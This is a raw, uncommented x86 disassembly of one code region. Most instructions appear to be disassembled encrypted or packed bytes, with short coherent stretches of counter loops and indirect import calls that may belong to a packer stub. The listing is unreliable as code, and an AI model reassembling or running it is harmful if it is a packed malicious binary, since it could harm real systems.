  404050:	pop    ds
  404051:	cmp    ebp,0x6f
  404054:	dec    esp
  404055:	aad    0x3a
  404057:	lds    edi,FWORD PTR [edi+esi*8-0x68]
  40405b:	pop    eax
  40405c:	aaa    
  40405d:	imul   BYTE PTR [ebx+0x7a]
  404060:	and    DWORD PTR [ebp-0x4d],edx
  404063:	sbb    edi,ebp
  404065:	fdivp  st(4),st
  404067:	hlt    
  404068:	mov    edx,0xef80e6ab
  40406d:	jp     0x4040cd
  40406f:	lods   eax,DWORD PTR ds:[esi]
  404070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404071:	aad    0x79
  404073:	inc    eax
  404074:	fbstp  TBYTE PTR [ebp+0x747228ec]
  40407a:	repnz aas 
  40407c:	mul    DWORD PTR [ecx]
  40407e:	into   
  40407f:	pop    esp
  404080:	fist   DWORD PTR [ebx-0x9]
  404083:	enter  0xefe8,0xa6
  404087:	mov    ebp,DWORD PTR [ebp+0xaad7e0e]
  40408d:	pop    ecx
  40408e:	jmp    0x2f87:0x9ca7e608
  404095:	mov    al,0x26
  404097:	sar    DWORD PTR [edi],0x67
  40409a:	les    edx,FWORD PTR [edi+0x5d4f9db9]
  4040a0:	aad    0x5f
  4040a2:	inc    ebp
  4040a3:	dec    esp
  4040a4:	inc    esp
  4040a5:	pop    esi
  4040a6:	push   es
  4040a7:	neg    BYTE PTR [ecx]
  4040a9:	stos   BYTE PTR es:[edi],al
  4040aa:	mov    WORD PTR [ebx+0x43c0d580],ds
  4040b0:	push   ds
  4040b1:	pop    ebx
  4040b2:	or     al,0x70
  4040b4:	and    BYTE PTR [edi+0x5fb103e5],ch
  4040ba:	jle    0x4040e7
  4040bc:	imul   eax,DWORD PTR [ecx-0x2710b8b],0x5
  4040c3:	add    cl,ch
  4040c5:	mov    bh,0x2
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xcbf7e6c1
  4040e3:	push   ecx
  4040e4:	or     ebx,DWORD PTR [edx+0x7878269e]
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x404087
  4040ef:	pop    ebx
  4040f0:	mov    edi,0xe6dea9ee
  4040f5:	sub    al,0x91
  4040f7:	adc    esp,esi
  4040f9:	fistp  WORD PTR [edi-0x71]
  4040fc:	push   edx
  4040fd:	(bad)  
  4040fe:	scas   al,BYTE PTR es:[edi]
  4040ff:	fcom   DWORD PTR [ebp-0x645238a6]
  404105:	sub    eax,DWORD PTR [eax+0x3e]
  404108:	jg     0x40415d
  40410a:	outs   dx,BYTE PTR ds:[esi]
  40410b:	jmp    0x5e7c:0xf2d5d148
  404112:	sub    eax,0x9150f22b
  404117:	mov    ds:0x642e97d5,eax
  40411c:	pop    eax
  40411d:	repz jecxz 0x404150
  404120:	xchg   esp,eax
  404121:	stos   DWORD PTR es:[edi],eax
  404122:	call   0x97d8:0xcd5cf14f
  404129:	xlat   BYTE PTR ds:[ebx]
  40412a:	in     eax,0x7a
  40412c:	sbb    eax,0x95e3267
  404131:	or     eax,0xa11d0c21
  404136:	jle    0x4041a1
  404138:	xor    eax,0x5ec170fb
  40413d:	pop    esp
  40413e:	add    eax,DWORD PTR [edi+0x7]
  404141:	cdq    
  404142:	(bad)  
  404143:	inc    edx
  404144:	aam    0x3a
  404146:	test   eax,0xa4515181
  40414b:	fmul   QWORD PTR [ebp+ebx*8-0xa81a0bc]
  404152:	xor    cl,ah
  404154:	mov    al,ds:0x99fa1894
  404159:	inc    edi
  40415a:	fsubr  DWORD PTR [ecx]
  40415c:	jmp    0xe08a62f1
  404161:	(bad)  
  404162:	jge    0x40416d
  404164:	lods   eax,DWORD PTR ds:[esi]
  404165:	push   0x65a7ee87
  40416a:	in     eax,0x9f
  40416c:	adc    ebp,DWORD PTR [eax-0x1d8be068]
  404172:	leave  
  404173:	stos   BYTE PTR es:[edi],al
  404174:	mov    edx,0xa6fc6f9f
  404179:	xor    ah,BYTE PTR es:[ebp-0x74]
  40417d:	cmc    
  40417e:	out    0x90,al
  404180:	rol    DWORD PTR [esi],cl
  404182:	sahf   
  404183:	push   ss
  404184:	(bad)  
  404185:	fstp   QWORD PTR [edi]
  404187:	lea    edx,[ecx]
  404189:	pop    es
  40418a:	and    BYTE PTR [esi+0x5689d584],ah
  404190:	aaa    
  404191:	lds    esi,FWORD PTR [ebx]
  404193:	les    edx,FWORD PTR [eax-0x20e72349]
  404199:	dec    eax
  40419a:	nop
  40419b:	push   edi
  40419c:	pop    ss
  40419d:	mov    ecx,DWORD PTR [ecx+0x34f7ce94]
  4041a3:	fs aaa 
  4041a5:	loop   0x404182
  4041a7:	hlt    
  4041a8:	adc    BYTE PTR [ebp+0x43],bl
  4041ab:	inc    esp
  4041ac:	imul   edi,ebp,0xffffff9f
  4041af:	ret    0x9e15
  4041b2:	iret   
  4041b3:	sbb    edi,esp
  4041b5:	rcl    BYTE PTR [edx+esi*2-0xd132a61],1
  4041bc:	and    bh,cl
  4041be:	jl     0x404197
  4041c0:	cmp    ch,BYTE PTR ds:0xb16d7f1d
  4041c6:	(bad)  
  4041c7:	imul   ebx,DWORD PTR [ecx],0x7d
  4041ca:	mov    esi,0xeef524dd
  4041cf:	xor    dh,BYTE PTR [ecx]
  4041d1:	add    BYTE PTR [ebp+0x65],al
  4041d4:	popf   
  4041d5:	push   eax
  4041d6:	or     BYTE PTR [esi-0x477f3c11],al
  4041dc:	dec    edi
  4041dd:	out    0x13,eax
  4041df:	cmp    eax,0xeba8de96
  4041e4:	rcl    DWORD PTR [edx],cl
  4041e6:	inc    edx
  4041e7:	ret    0xb3bd
  4041ea:	xor    DWORD PTR [ebp+0x13],eax
  4041ed:	sub    BYTE PTR [ebx],al
  4041ef:	push   0x1e
  4041f1:	retf   0xf7a4
  4041f4:	(bad)  [ebx+0x16a03423]
  4041fa:	in     eax,dx
  4041fb:	adc    edi,ecx
  4041fd:	sti    
  4041fe:	sub    eax,0xa4ea55e6
  404203:	lods   al,BYTE PTR ds:[esi]
  404204:	mov    ebp,0x16b00e41
  404209:	add    BYTE PTR [eax-0x6320313c],al
  40420f:	dec    edi
  404210:	xor    eax,0xad9c6b41
  404215:	psubb  mm1,QWORD PTR [edi+0x60]
  404219:	cmp    BYTE PTR [edi+0x26e9c6af],dl
  40421f:	mov    edx,0xd5356780
  404224:	jne    0x404208
  404226:	ss mov ebp,0x2d9d15de
  40422c:	dec    esi
  40422d:	inc    ecx
  40422e:	test   eax,0x2bb68aa1
  404233:	aam    0x22
  404235:	das    
  404236:	pop    esp
  404237:	dec    eax
  404238:	mov    ds:0x5aad3c3c,eax
  40423d:	sbb    dl,al
  40423f:	pop    ecx
  404240:	mov    al,0xb7
  404242:	mov    edx,0x961bcbba
  404247:	push   ebx
  404248:	in     al,0x62
  40424a:	ret    
  40424b:	pop    esi
  40424c:	rep outs dx,BYTE PTR ds:[esi]
  40424e:	sar    DWORD PTR [ecx-0x4],1
  404251:	mov    edi,0x8c0cfa03
  404256:	push   ebx
  404257:	jmp    0x4042c2
  404259:	xchg   dl,al
  40425b:	gs jbe 0x40429f
  40425e:	pop    ds
  40425f:	sahf   
  404260:	into   
  404261:	ret    0x7ec8
  404264:	sbb    al,0xdb
  404266:	and    ebp,DWORD PTR [esi+edi*2+0x59712b81]
  40426d:	rsm    
  40426f:	sbb    al,0xe9
  404271:	std    
  404272:	in     eax,0x71
  404274:	loop   0x404270
  404276:	mov    esi,0xc80e9a44
  40427b:	add    BYTE PTR [ecx+ebx*8-0x11],bl
  40427f:	or     al,BYTE PTR [ebx]
  404281:	stos   DWORD PTR es:[edi],eax
  404282:	inc    edx
  404283:	push   cs
  404284:	mov    ch,0x90
  404286:	inc    ecx
  404287:	sub    eax,0x162d3ae0
  40428c:	call   0xaa930286
  404291:	neg    DWORD PTR [ebx]
  404293:	xor    BYTE PTR [edx-0x3bc70875],bh
  404299:	inc    ecx
  40429a:	pop    ds
  40429b:	adc    BYTE PTR [eax-0x44],cl
  40429e:	add    dh,bh
  4042a0:	and    eax,0x3469fab4
  4042a5:	fld    DWORD PTR [edx+0x21]
  4042a8:	ss or  eax,0xa5d91a28
  4042ae:	dec    ecx
  4042af:	xchg   ebx,eax
  4042b0:	xchg   ebx,eax
  4042b1:	push   eax
  4042b2:	or     eax,0xb25a8db2
  4042b7:	sar    BYTE PTR [edi+eax*8],cl
  4042ba:	call   0x716513ec
  4042bf:	xchg   BYTE PTR [ecx-0x5fb0a340],ch
  4042c5:	cmp    BYTE PTR [edi],ah
  4042c7:	jne    0x4042bb
  4042c9:	js     0x404341
  4042cb:	outs   dx,BYTE PTR ds:[esi]
  4042cc:	push   ds
  4042cd:	jmp    0x515dbba0
  4042d2:	aaa    
  4042d3:	xchg   BYTE PTR [esi+0x60b01ba0],ah
  4042d9:	call   0x9e675c6e
  4042de:	mov    edx,0x5054e5b8
  4042e3:	add    ch,BYTE PTR ds:0x6795a3c1
  4042e9:	clc    
  4042ea:	xor    bh,BYTE PTR [esi+0x10b2f979]
  4042f0:	or     DWORD PTR [ebx+0x77],ecx
  4042f3:	sub    DWORD PTR [eax+0xdd4c6e],edi
  4042f9:	mov    cl,0xa
  4042fb:	shl    DWORD PTR [esi],1
  4042fd:	std    
  4042fe:	into   
  4042ff:	fsub   DWORD PTR [ebp+0x3d4aebd3]
  404305:	in     al,dx
  404306:	ds stos BYTE PTR es:[edi],al
  404308:	pop    ss
  404309:	mov    DWORD PTR [eax+0x68],esi
  40430c:	ficom  DWORD PTR [edx-0x14324220]
  404312:	out    dx,eax
  404313:	xor    BYTE PTR [ebp+ecx*2+0x21],ah
  404317:	sbb    BYTE PTR [edi],bl
  404319:	sbb    al,BYTE PTR [ebx-0x7c]
  40431c:	call   0x18f0:0x11e257d9
  404323:	out    0xb8,al
  404325:	sbb    DWORD PTR [esi+edi*8],edi
  404328:	scas   eax,DWORD PTR es:[edi]
  404329:	loop   0x40438b
  40432b:	mov    ds:0x3fec9cfa,eax
  404330:	js     0x404375
  404332:	jne    0x40436a
  404334:	mov    eax,0xe180c0eb
  404339:	push   0xb772b18e
  40433e:	rol    BYTE PTR [ebp-0x19],0x87
  404342:	pop    edx
  404343:	inc    ebp
  404344:	mov    bl,0x84
  404346:	aas    
  404347:	xchg   ebx,ebp
  404349:	cmp    ebp,ebp
  40434b:	in     al,0x38
  40434d:	in     eax,dx
  40434e:	iret   
  40434f:	inc    esp
  404350:	xchg   edx,eax
  404351:	(bad)  
  404352:	xlat   BYTE PTR ds:[ebx]
  404353:	or     eax,0x69992193
  404358:	leave  
  404359:	call   0x37d:0x404986f7
  404360:	dec    esp
  404361:	jns    0x4043c9
  404363:	icebp  
  404364:	out    dx,al
  404365:	push   ecx
  404366:	mov    ecx,ss
  404368:	pusha  
  404369:	aas    
  40436a:	ror    ebx,1
  40436c:	sti    
  40436d:	inc    esp
  40436e:	(bad)  
  40436f:	cmp    DWORD PTR [ecx+0xc458b08],ecx
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a79d
  4043aa:	add    DWORD PTR ds:0x42a781,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7d5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7d5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7d5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7d5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7d5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a865
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	inc    ecx
  40441a:	adc    cl,BYTE PTR [edi+0x782b1cf5]
  404420:	js     0x40446f
  404422:	jle    0x40449c
  404424:	js     0x4043f8
  404426:	mov    ecx,0x22803f47
  40442b:	push   esi
  40442c:	sbb    BYTE PTR [edx+eiz*1-0x4f],dl
  404430:	shr    BYTE PTR [ecx-0x42],0xa4
  404434:	inc    ecx
  404435:	xlat   BYTE PTR ds:[ebx]
  404436:	neg    DWORD PTR [ebx-0xe634e40]
  40443c:	in     eax,dx
  40443d:	mov    WORD PTR [edx-0x31],ds
  404440:	loopne 0x4043e4
  404442:	out    dx,eax
  404443:	sub    ch,BYTE PTR [eax-0x24]
  404446:	dec    DWORD PTR [eax]
  404448:	stos   DWORD PTR es:[edi],eax
  404449:	jo     0x404487
  40444b:	xchg   edx,eax
  40444c:	cmp    eax,0x319d75c4
  404451:	stc    
  404452:	mov    ds:0x79026191,al
  404457:	inc    ebp
  404458:	pop    ecx
  404459:	pop    ss
  40445a:	jl     0x4044b9
  40445c:	jle    0x404421
  40445e:	or     BYTE PTR [ebp-0xa],al
  404461:	pop    ebx
  404462:	rol    DWORD PTR [edx-0x6f2274ca],cl
  404468:	mov    ebp,0x3e4a6d48
  40446d:	adc    ebx,DWORD PTR [edx-0x22]
  404470:	es jbe 0x40443e
  404473:	cli    
  404474:	cmc    
  404475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404476:	mov    bh,0xe4
  404478:	iret   
  404479:	pop    ds
  40447a:	fldcw  WORD PTR ds:0x5f6794fe
  404480:	shl    DWORD PTR [eax],0xb6
  404483:	mov    bh,0x3b
  404485:	fisub  DWORD PTR [edx]
  404487:	cmp    ebp,DWORD PTR [edx-0x65]
  40448a:	mov    ebp,DWORD PTR [edi+0x36]
  40448d:	mov    WORD PTR [ecx+0x7e],?
  404490:	ja     0x404438
  404492:	push   ebp
  404493:	pop    ebx
  404494:	xor    dh,BYTE PTR [ebx]
  404496:	and    cl,BYTE PTR [ebx]
  404498:	mov    bh,0xd9
  40449a:	mov    ds:0x47a7cb44,eax
  40449f:	xor    edi,esp
  4044a1:	es out dx,al
  4044a3:	jmp    0x41f0:0x5d8693cc
  4044aa:	pop    ebp
  4044ab:	xchg   ebp,eax
  4044ac:	sar    BYTE PTR [ebp+0x546dd453],0x9d
  4044b3:	jl     0x4044fc
  4044b5:	push   ebp
  4044b6:	fidiv  DWORD PTR [esi+ebp*2-0x16777f0]
  4044bd:	mov    esi,?
  4044bf:	or     eax,0xe833f90d
  4044c5:	arpl   WORD PTR [edx+0x54],sp
  4044c8:	fimul  DWORD PTR [ecx]
  4044ca:	mov    ds:0x2928408c,al
  4044cf:	mov    bl,0x14
  4044d1:	jl     0x4044da
  4044d3:	push   edi
  4044d4:	mov    dl,BYTE PTR [eax-0x65]
  4044d7:	aaa    
  4044d8:	test   al,0xb4
  4044da:	idiv   eax
  4044dc:	arpl   WORD PTR [edx-0x6f],di
  4044df:	ja     0x4044c8
  4044e1:	stos   DWORD PTR es:[edi],eax
  4044e2:	ds pop ss
  4044e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044e5:	or     dh,BYTE PTR [ecx+0x4a4f9506]
  4044eb:	xchg   BYTE PTR [ebx-0x1877cd08],dl
  4044f1:	icebp  
  4044f2:	hlt    
  4044f3:	into   
  4044f4:	or     BYTE PTR [eax-0xd73ef34],dl
  4044fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044fb:	sbb    eax,0x67f15970
  404500:	dec    esi
  404501:	pop    ecx
  404502:	mov    cl,0x77
  404504:	lahf   
  404505:	dec    ecx
  404506:	je     0x4044bf
  404508:	add    dl,BYTE PTR ds:0x219bf69f
  40450e:	sahf   
  40450f:	ror    ecx,1
  404511:	inc    ebp
  404512:	pop    es
  404513:	pop    edx
  404514:	sub    ch,BYTE PTR [edx]
  404516:	mov    ebp,0x8b15b91
  40451b:	cld    
  40451c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451d:	mov    edx,0xc537312e
  404522:	jb     0x404574
  404524:	mov    BYTE PTR [eax],bl
  404526:	dec    ebx
  404527:	inc    ebp
  404528:	or     DWORD PTR ds:[ecx+edx*8-0x8986c4f],ebx
  404530:	inc    ebx
  404531:	dec    ecx
  404532:	push   0xffffffc1
  404534:	push   edi
  404535:	lds    esp,FWORD PTR [edi]
  404537:	lods   eax,DWORD PTR ds:[esi]
  404538:	bound  esp,QWORD PTR [ecx-0x2ec8fc53]
  40453e:	xchg   ebx,eax
  40453f:	mov    esp,0x859e2c2f
  404544:	in     al,dx
  404545:	lds    ebx,FWORD PTR [ebx+0x59]
  404548:	cmp    eax,0x99479e38
  40454d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454e:	xor    BYTE PTR [ecx],cl
  404550:	push   ebp
  404551:	mov    al,0xde
  404553:	adc    eax,0x88ba6609
  404558:	and    bl,dl
  40455a:	push   edx
  40455b:	mov    al,ds:0xb875af01
  404560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404561:	ds in  al,dx
  404563:	gs pop es
  404565:	popa   
  404566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404567:	out    0xc,eax
  404569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40456a:	jbe    0x4045da
  40456c:	bound  ecx,QWORD PTR [esp+edi*1]
  40456f:	fs aas 
  404571:	add    edx,DWORD PTR [ebx+edi*2+0x67]
  404575:	pop    ss
  404576:	sub    ch,BYTE PTR [ebx+0x50ffb9c0]
  40457c:	and    BYTE PTR [eax],ah
  40457e:	inc    esi
  40457f:	sbb    ch,BYTE PTR [edi+ebx*4]
  404582:	cmp    ebx,ecx
  404584:	dec    edx
  404585:	push   edi
  404586:	jbe    0x404561
  404588:	add    esi,0xdd081735
  40458e:	test   al,0x48
  404590:	mov    cs,ebx
  404592:	xor    BYTE PTR [eax+0x77],0x6e
  404596:	in     eax,dx
  404597:	push   ds
  404598:	adc    bl,BYTE PTR [edi-0x12]
  40459b:	stos   BYTE PTR es:[edi],al
  40459c:	pusha  
  40459d:	into   
  40459e:	int    0x70
  4045a0:	cld    
  4045a1:	ret    
  4045a2:	jae    0x40460f
  4045a4:	pop    ecx
  4045a5:	(bad)  
  4045a6:	popf   
  4045a7:	jmp    0x40452b
  4045a9:	and    al,0x48
  4045ab:	popf   
  4045ac:	lock pop es
  4045ae:	pop    ds
  4045af:	cmp    DWORD PTR [esi+0x20],edi
  4045b2:	jnp    0x40455a
  4045b4:	repz pop ss
  4045b6:	fsub   QWORD PTR [eax]
  4045b8:	jmp    0x4045f7
  4045ba:	mov    al,0x4f
  4045bc:	repnz rcl BYTE PTR [ecx],0x66
  4045c0:	inc    ebp
  4045c1:	adc    bl,dl
  4045c3:	ss stc 
  4045c5:	and    ah,bh
  4045c7:	scas   eax,DWORD PTR es:[edi]
  4045c8:	ret    0x4b71
  4045cb:	pop    ebx
  4045cc:	adc    edi,DWORD PTR [esi+0x16506d02]
  4045d2:	lods   eax,DWORD PTR ds:[esi]
  4045d3:	and    BYTE PTR [eax-0x75e98838],bl
  4045d9:	(bad)
  4045dc:	jmp    FWORD PTR [edx+0x4e4fc1d1]
  4045e2:	xlat   BYTE PTR ds:[ebx]
  4045e3:	inc    ecx
  4045e4:	hlt    
  4045e5:	out    dx,al
  4045e6:	jl     0x404590
  4045e8:	sahf   
  4045e9:	rol    DWORD PTR [eax],1
  4045eb:	xchg   edi,eax
  4045ec:	dec    esp
  4045ed:	push   ds
  4045ee:	pop    edx
  4045ef:	sbb    al,0xd7
  4045f1:	mov    ds:0x38c00823,eax
  4045f6:	jg     0x404673
  4045f8:	jmp    0x398c:0xbffb27d6
  4045ff:	lds    edi,FWORD PTR [edx-0x9]
  404602:	push   0x8e1ea631
  404607:	in     al,0x30
  404609:	nop
  40460a:	mov    ebx,0xdc23e31a
  40460f:	aam    0xc8
  404611:	lahf   
  404612:	rcr    BYTE PTR [edx+0x1dc71249],1
  404618:	jmp    0xf62e5ada
  40461d:	gs cld 
  40461f:	or     al,0xc3
  404621:	mov    DWORD PTR [edi+0x27],0xf8d7f1ba
  404628:	push   ebx
  404629:	ss push ebx
  40462b:	inc    esi
  40462c:	pop    ebp
  40462d:	mov    edi,0x8d2e1cf6
  404632:	xchg   ebp,eax
  404633:	sbb    ecx,esi
  404635:	addr16 push 0xf7ababfe
  40463b:	ror    DWORD PTR [eax+edi*8-0x27],0x23
  404640:	or     DWORD PTR [eax+0x2796af9a],ebx
  404646:	test   al,0xd6
  404648:	pop    ss
  404649:	jo     0x404600
  40464b:	cmc    
  40464c:	int    0x94
  40464e:	sub    ebx,esi
  404650:	mov    edi,0xc2ba843d
  404655:	call   0x217927a6
  40465a:	ja     0x404682
  40465c:	mov    esi,0xc8d49ab0
  404661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404662:	pushf  
  404663:	pop    ss
  404664:	in     al,dx
  404665:	ffree  st(1)
  404667:	push   esp
  404668:	loope  0x404669
  40466a:	imul   esi,DWORD PTR [ebx],0x42
  40466d:	inc    ebp
  40466e:	pusha  
  40466f:	mov    ebx,0x4330da05
  404674:	lea    ebp,[ecx*8+0x20509653]
  40467b:	pop    ecx
  40467c:	inc    edx
  40467d:	inc    esi
  40467e:	or     al,0x33
  404680:	daa    
  404681:	cwde   
  404682:	or     DWORD PTR [edx-0x6e],0xd132190e
  404689:	inc    ebx
  40468a:	ret    0x558d
  40468d:	loopne 0x4046ee
  40468f:	cmp    eax,0x8a5a81a
  404694:	sub    BYTE PTR [ebx+0x5e983f7f],ch
  40469a:	or     bl,BYTE PTR [esi]
  40469c:	and    ecx,ebx
  40469e:	lock xor eax,0x1f9597c8
  4046a4:	out    dx,al
  4046a5:	inc    ebp
  4046a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a7:	into   
  4046a8:	fiadd  WORD PTR [ebp-0x4f]
  4046ab:	mov    ss,ecx
  4046ad:	and    ebp,edx
  4046af:	push   esp
  4046b0:	test   BYTE PTR [edx-0x374eb641],ch
  4046b6:	xor    esp,esp
  4046b8:	aas    
  4046b9:	mov    cl,0x56
  4046bb:	sbb    dl,dl
  4046bd:	dec    ebp
  4046be:	or     BYTE PTR [ecx],cl
  4046c0:	sbb    DWORD PTR [ecx+0x2549a880],eax
  4046c6:	adc    al,0x76
  4046c8:	cmp    eax,0x23d173ca
  4046cd:	hlt    
  4046ce:	adc    esp,ecx
  4046d0:	icebp  
  4046d1:	xchg   ebx,eax
  4046d2:	jno    0x4046d9
  4046d4:	mov    bl,0x1d
  4046d6:	push   es
  4046d7:	stos   BYTE PTR es:[edi],al
  4046d8:	fst    DWORD PTR [esp+ebx*4+0x2c55d3c7]
  4046df:	mov    esp,0x4b261fa3
  4046e4:	bnd ja 0x404668
  4046e7:	test   al,0x73
  4046e9:	mov    al,0xec
  4046eb:	add    al,0x5a
  4046ed:	jb     0x404742
  4046ef:	fcmovbe st,st(1)
  4046f1:	(bad)  
  4046f2:	aas    
  4046f3:	lods   eax,DWORD PTR ds:[esi]
  4046f4:	cld    
  4046f5:	jnp    0x4046d7
  4046f7:	xchg   edi,eax
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42a795,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a795
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a795,esi
  404715:	cmp    DWORD PTR ds:0x42a795,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a795,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a85d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa68
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x924c83de
  404770:	call   0x4d78:0x78297125
  404777:	jle    0x4047f1
  404779:	js     0x404756
  40477b:	push   ebp
  40477c:	aad    0x44
  40477e:	aam    0xb7
  404780:	and    ebx,0xffffffc4
  404783:	xlat   BYTE PTR ds:[ebx]
  404784:	pop    edx
  404785:	or     DWORD PTR [edi+eiz*4],0x6cfd5f2b
  40478c:	dec    esi
  40478d:	cdq    
  40478e:	add    esi,edi
  404790:	nop
  404791:	adc    BYTE PTR [edx+0x77],ah
  404794:	sahf   
  404795:	mov    esi,0x7c6418bf
  40479a:	mov    cl,bl
  40479c:	in     eax,dx
  40479d:	jl     0x4047f2
  40479f:	cmp    eax,0x98f4b0c7
  4047a4:	syscall 
  4047a6:	(bad)  
  4047a8:	jle    0x4047c8
  4047aa:	outs   dx,BYTE PTR ds:[esi]
  4047ab:	data16 hlt 
  4047ad:	mov    bh,0xd5
  4047af:	and    al,0xb6
  4047b1:	jns    0x40473c
  4047b3:	sahf   
  4047b4:	stc    
  4047b5:	call   0xdcb1:0x123aa702
  4047bc:	arpl   WORD PTR ds:0x6dd7608d,bp
  4047c2:	sbb    al,bh
  4047c4:	popa   
  4047c5:	cdq    
  4047c6:	adc    BYTE PTR ds:0xd7f68bf,0x78
  4047cd:	out    dx,eax
  4047ce:	dec    ecx
  4047cf:	mov    bl,0x5d
  4047d1:	lock std 
  4047d3:	fistp  DWORD PTR [eax-0x181ae945]
  4047d9:	icebp  
  4047da:	mov    ah,0x42
  4047dc:	or     ebp,DWORD PTR [ebp+0xc]
  4047df:	jb     0x404834
  4047e1:	mov    BYTE PTR [edi+0xe376e8e],dh
  4047e7:	and    DWORD PTR [eax],eax
  4047e9:	xchg   esp,eax
  4047ea:	sbb    BYTE PTR [edi-0x5aec5708],ch
  4047f0:	je     0x404830
  4047f2:	mov    ds:0xcfdf03e3,eax
  4047f7:	and    BYTE PTR [ecx+ebx*1+0x13db4818],0xce
  4047ff:	ins    DWORD PTR es:[edi],dx
  404800:	(bad)  
  404802:	fisubr DWORD PTR [ecx-0x90830ac]
  404808:	push   ss
  404809:	cld    
  40480a:	and    BYTE PTR [ecx+edi*8],ch
  40480d:	or     al,0x21
  40480f:	jo     0x404848
  404811:	mov    bh,0x8
  404813:	mov    BYTE PTR [edx-0x38ac51cd],ah
  404819:	scas   al,BYTE PTR es:[edi]
  40481a:	jecxz  0x4047b7
  40481c:	ficom  DWORD PTR [edx]
  40481e:	jo     0x404876
  404820:	iret   
  404821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404822:	jns    0x4047c2
  404824:	into   
  404825:	add    eax,0xb14696be
  40482a:	xor    al,0xf2
  40482c:	loope  0x4047c6
  40482e:	in     eax,0xbb
  404830:	xor    bl,BYTE PTR [edi+edi*8+0x4b]
  404834:	es lahf 
  404836:	mov    esi,0xa4531bc5
  40483b:	mov    bl,0x11
  40483d:	stos   BYTE PTR es:[edi],al
  40483e:	ds in  eax,dx
  404840:	or     DWORD PTR [esi-0x1377a69],ebp
  404846:	sbb    al,0x23
  404848:	or     DWORD PTR [eax+0x2f449184],ecx
  40484e:	xchg   esi,eax
  40484f:	jo     0x404883
  404851:	loope  0x404830
  404853:	imul   DWORD PTR [ebx]
  404855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404856:	lods   al,BYTE PTR ds:[esi]
  404857:	sbb    ecx,ecx
  404859:	jmp    FWORD PTR [eax+0x229899b0]
  40485f:	clc    
  404860:	jle    0x404856
  404862:	mov    ebx,0x40a4bf6a
  404867:	stos   DWORD PTR es:[edi],eax
  404868:	mov    ch,BYTE PTR [edx-0x34]
  40486b:	ret    0xfaa5
  40486e:	inc    ebx
  40486f:	adc    ch,bl
  404871:	(bad)  
  404872:	data16 lahf 
  404874:	sbb    BYTE PTR [ebx+0x4b3caedf],ah
  40487a:	xrelease xchg DWORD PTR [ecx-0x3c403dc9],edi
  404881:	push   edx
  404882:	(bad)  
  404883:	lods   eax,DWORD PTR ds:[esi]
  404884:	ins    DWORD PTR es:[edi],dx
  404885:	ror    BYTE PTR [edx],1
  404887:	inc    edx
  404888:	outs   dx,BYTE PTR ds:[esi]
  404889:	nop
  40488a:	repz jg 0x4048a9
  40488d:	jp     0x40482c
  40488f:	jo     0x404859
  404891:	mov    ebp,0xc2899197
  404896:	mov    ds:0xe92bfc71,eax
  40489b:	sti    
  40489c:	popa   
